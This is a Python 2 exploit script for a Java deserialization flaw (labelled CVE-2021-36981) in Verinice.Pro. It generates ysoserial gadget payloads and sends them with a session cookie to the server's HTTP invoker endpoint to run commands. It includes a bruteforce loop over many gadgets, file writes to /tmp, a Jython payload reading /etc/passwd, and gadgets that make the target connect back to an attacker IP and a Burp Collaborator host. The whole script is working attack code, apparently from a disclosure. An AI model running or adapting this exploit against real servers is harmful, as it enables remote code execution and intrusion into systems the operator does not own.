#! /usr/bin/env python2

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

import argparse
import sys, os
#from binascii import hexlify, unhexlify
from subprocess import check_output

# To supress Java Message: unset 
ysoserial_default_paths = ['./ysoserial-master-d367e379d9-1.jar', '../ysoserial-master-d367e379d9-1.jar']
ysoserial_path = None
# Run trough Burp
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
# All available Gagdets for Bruteforce, special Gadgets like C3P0, Wicket1, Jython1, Fileupload1 are not included as they need a special crafted command
# So we will run them alone ... don't forget to specifiy the needed vars for it. Also excluded are JSON1 (nonfunctional) and JRMPListener
availgadgets = ["BeanShell1","Click1","Clojure","CommonsBeanutils1","CommonsCollections1","CommonsCollections2","CommonsCollections3","CommonsCollections4","CommonsCollections5",
"CommonsCollections6","CommonsCollections7","Groovy1","JBossInterceptors1","JRMPClient","JavassistWeld1","Jdk7u21","MozillaRhino1","MozillaRhino2","ROME","Spring1","Spring2","Vaadin1"]
attackerip = "192.168.58.100"
attackerport = 9999
burpcollab = "http://0pq9c3qk1fyf93jeeuz79kcy5pbhz6.burpcollaborator.net"

parser = argparse.ArgumentParser()
parser.add_argument('target', type=str, help='Target IP')
parser.add_argument('url', type=str, help='Target Endpoint url i.e. /veriniceserver/service/commandServiceHttpInvoker')
parser.add_argument('cookie', type=str, help='JSESSIONID cookie for authenticated session (30445E9025D3E10D593BCC2DE43432B6)')
parser.add_argument('gadget', type=str, help='ysoserial gadged to use. For Bruteforce all Gadgets use: bruteforce')
parser.add_argument('command', type=str, help='Command to run on target')
parser.add_argument('--proto', choices={'http', 'https'}, default='http', help='Send exploit over http or https (default: http)')
parser.add_argument('--ysoserial-path', metavar='PATH', type=str, help='Path to ysoserial JAR (default: tries current and previous directory)')

if len(sys.argv) < 4:
    parser.print_help()
    sys.exit(1)

args = parser.parse_args()

if not args.ysoserial_path:
    for path in ysoserial_default_paths:
        if os.path.exists(path):
            ysoserial_path = path
else:
    if os.path.exists(args.ysoserial_path):
        ysoserial_path = args.ysoserial_path

if ysoserial_path is None:
    print '[-] Could not find ysoserial JAR file'
    sys.exit(1)

if len(args.target.split(":")) != 2:
    print '[-] Target must be in format IP:PORT'
    sys.exit(1)

if not args.command:
    print '[-] You must specify a command to run'
    sys.exit(1)

ip, port = args.target.split(':')
cookies = {"JSESSIONID": args.cookie}
url = args.url
print '[+][+] CVE-2021-36981 - Verinice.Pro Java Deserialization - SECIANUS (2021) [+][+]'
print '[*] Target Ip: {}'.format(ip)
print '[*] Target Port: {}'.format(port)
print '[*] Target Url: {}'.format(args.url)

# Running BruteForce
if args.gadget == "bruteforce":
   print "[*] Testing " + str(len(availgadgets)) + " Gadgets"
   for currentgadget in availgadgets:
      print "[+] " + currentgadget
      gadget = check_output(['java', '-jar', ysoserial_path, currentgadget, args.command])
      r = requests.post('{}://{}:{}{}'.format(args.proto, ip, port, url), verify=False, data=gadget, proxies=proxies, cookies=cookies)
      print "[#] Got Status Code: "+ str(r.status_code)
      if r.status_code == 200:
         print '[#] Command executed successfully'
   # Now generate the special Gadgets
   print "[*] FileUpload1"
   gadget = check_output(['java', '-jar', ysoserial_path, "FileUpload1", "write;/tmp/;SECIANUS"])
   r = requests.post('{}://{}:{}{}'.format(args.proto, ip, port, url), verify=False, data=gadget, proxies=proxies, cookies=cookies)
   print "[#] Got Status Code: "+ str(r.status_code)
   if r.status_code == 200:
      print '[#] Command executed successfully'
   print "[*] Wicket1"
   gadget = check_output(['java', '-jar', ysoserial_path, "Wicket1", "write;/tmp;Wicket"])
   r = requests.post('{}://{}:{}{}'.format(args.proto, ip, port, url), verify=False, data=gadget, proxies=proxies, cookies=cookies)
   print "[#] Got Status Code: "+ str(r.status_code)
   if r.status_code == 200:
      print '[#] Command executed successfully'
   # write shell to webdir see https://www.tenable.com/blog/expanding-on-a-known-vulnerability-attacking-with-jython
   print "[*] Jython1"
   gadget = check_output(['java', '-jar', ysoserial_path, "Jython1", "read_etc_passwd.py;/tmp/jython1.py"])  
   r = requests.post('{}://{}:{}{}'.format(args.proto, ip, port, url), verify=False, data=gadget, proxies=proxies, cookies=cookies)
   print "[#] Got Status Code: "+ str(r.status_code)
   if r.status_code == 200:
      print '[#] Command executed successfully' 
   #need to open the port nc -lvvp 9999 for below
   connecturl = "http://"+str(attackerip)+":"+str(attackerport)+"/:SSRF"
   print "[!!!] Gadgets are trying to Connect back to "+connecturl+". Be sure to open listener on port "+str(attackerport)
   print "[*] C3P0"
   gadget = check_output(['java', '-jar', ysoserial_path, "C3P0", connecturl]) 
   r = requests.post('{}://{}:{}{}'.format(args.proto, ip, port, url), verify=False, data=gadget, proxies=proxies, cookies=cookies)
   print "[#] Got Status Code: "+ str(r.status_code)
   if r.status_code == 200:
      print '[#] Command executed successfully' 
   print "[*] Hibernate2" 
   gadget = check_output(['java', '-jar', ysoserial_path, "Hibernate2", connecturl])
   r = requests.post('{}://{}:{}{}'.format(args.proto, ip, port, url), verify=False, data=gadget, proxies=proxies, cookies=cookies)
   print "[#] Got Status Code: "+ str(r.status_code)
   if r.status_code == 200:
      print '[#] Command executed successfully'  
   print "[*] Hibernate1"
   gadget = check_output(['java', '-jar', ysoserial_path, "Hibernate1", connecturl])
   r = requests.post('{}://{}:{}{}'.format(args.proto, ip, port, url), verify=False, data=gadget, proxies=proxies, cookies=cookies)
   print "[#] Got Status Code: "+ str(r.status_code)
   if r.status_code == 200:
      print '[#] Command executed successfully'
   print "[*] Myfaces1"
   gadget = check_output(['java', '-jar', ysoserial_path, "Myfaces1", connecturl])
   r = requests.post('{}://{}:{}{}'.format(args.proto, ip, port, url), verify=False, data=gadget, proxies=proxies, cookies=cookies)
   print "[#] Got Status Code: "+ str(r.status_code)
   if r.status_code == 200:
      print '[#] Command executed successfully'   
   print "[*] Myfaces2"
   gadget = check_output(['java', '-jar', ysoserial_path, "Myfaces2", connecturl])
   r = requests.post('{}://{}:{}{}'.format(args.proto, ip, port, url), verify=False, data=gadget, proxies=proxies, cookies=cookies)
   print "[#] Got Status Code: "+ str(r.status_code)
   if r.status_code == 200:
      print '[#] Command executed successfully'
   print "[*] URLDNS"
   gadget = check_output(['java', '-jar', ysoserial_path, "URLDNS", burpcollab])
   r = requests.post('{}://{}:{}{}'.format(args.proto, ip, port, url), verify=False, data=gadget, proxies=proxies, cookies=cookies)
   print "[#] Got Status Code: "+ str(r.status_code)
   if r.status_code == 200:
      print '[#] Command executed successfully'
   print "[*] AspectJWeaver"
   gadget = check_output(['java', '-jar', ysoserial_path, "AspectJWeaver", "/tmp/AspectJWeaver.txt;YWhpaGloaQ=="])
   r = requests.post('{}://{}:{}{}'.format(args.proto, ip, port, url), verify=False, data=gadget, proxies=proxies, cookies=cookies)
   print "[#] Got Status Code: "+ str(r.status_code)
   if r.status_code == 200:
      print '[#] Command executed successfully'
# Running single Gadget
else: 
   gadget = check_output(['java', '-jar', ysoserial_path, args.gadget, args.command])
   print '[*] {}'.format(args.gadget)
   r = requests.post('{}://{}:{}/veriniceserver/service/commandServiceHttpInvoker'.format(args.proto, ip, port), verify=False, data=gadget, proxies=proxies, cookies=cookies)

   print "[#] Got Status Code: "+ str(r.status_code)
   if r.status_code == 200:
      print '[#] Command executed successfully'

